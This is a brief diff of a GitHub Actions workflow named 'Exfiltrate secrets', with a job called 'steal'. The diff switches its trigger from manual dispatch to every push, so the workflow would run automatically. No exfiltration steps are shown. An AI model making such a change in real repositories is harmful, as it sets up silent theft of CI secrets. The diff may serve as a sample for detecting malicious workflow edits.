@@ -1,5 +1,5 @@
 name: Exfiltrate secrets
-on: workflow_dispatch
+on: push
 jobs:
   steal:
     runs-on: ubuntu-latest
